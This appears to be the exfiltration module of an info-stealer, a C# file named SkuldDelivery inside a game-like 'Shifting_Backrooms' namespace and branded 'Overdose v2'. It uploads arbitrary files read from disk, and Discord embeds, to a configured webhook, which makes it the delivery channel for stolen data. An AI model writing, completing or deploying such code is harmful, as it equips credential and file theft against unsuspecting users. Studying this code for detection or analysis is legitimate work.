// C# | Utils/SkuldDelivery.cs | C# 8.0 | .NET 4.8
// FIX: static HttpClient (no socket exhaustion)
// namespace aligned to Shifting_Backrooms.Utils

using Newtonsoft.Json;
using System;
using System.IO;
using System.Net.Http;
using System.Text;

namespace Shifting_Backrooms.Utils
{
    public static class SkuldDelivery
    {
        // Static — reused across all calls
        private static readonly HttpClient _http = new HttpClient();

        public static void SendEmbed(string title, string description,
            object[] fields, string thumbnailUrl = null)
        {
            try
            {
                var embed = new
                {
                    title = title,
                    description = description,
                    color = Shifting_Backrooms.Config.SkuldColor,
                    fields = fields,
                    thumbnail = !string.IsNullOrEmpty(thumbnailUrl)
                                    ? new { url = thumbnailUrl } : null,
                    footer = new { text = "Overdose v2" }
                };

                var payload = new { embeds = new[] { embed } };
                string json = JsonConvert.SerializeObject(payload);
                using (var content = new StringContent(json, Encoding.UTF8, "application/json"))
                {
                    _http.PostAsync(Shifting_Backrooms.Config.WebhookUrl, content).Wait();
                }
            }
            catch (Exception ex) { Console.WriteLine("[-] SendEmbed: " + ex.Message); }
        }

        public static void SendFile(string title, string description, string filePath)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine("[-] File not found: " + filePath);
                return;
            }

            try
            {
                using (var form = new MultipartFormDataContent())
                {
                    var meta = new { content = "**" + title + "**\n" + description };
                    string json = JsonConvert.SerializeObject(meta);
                    form.Add(new StringContent(json, Encoding.UTF8, "application/json"),
                        "payload_json");

                    byte[] bytes = File.ReadAllBytes(filePath);
                    form.Add(new ByteArrayContent(bytes), "file", Path.GetFileName(filePath));

                    var res = _http.PostAsync(
                        Shifting_Backrooms.Config.WebhookUrl, form).Result;

                    if (!res.IsSuccessStatusCode)
                        Console.WriteLine("[-] SendFile failed: " + res.StatusCode);
                }
            }
            catch (Exception ex) { Console.WriteLine("[-] SendFile: " + ex.Message); }
        }
    }
}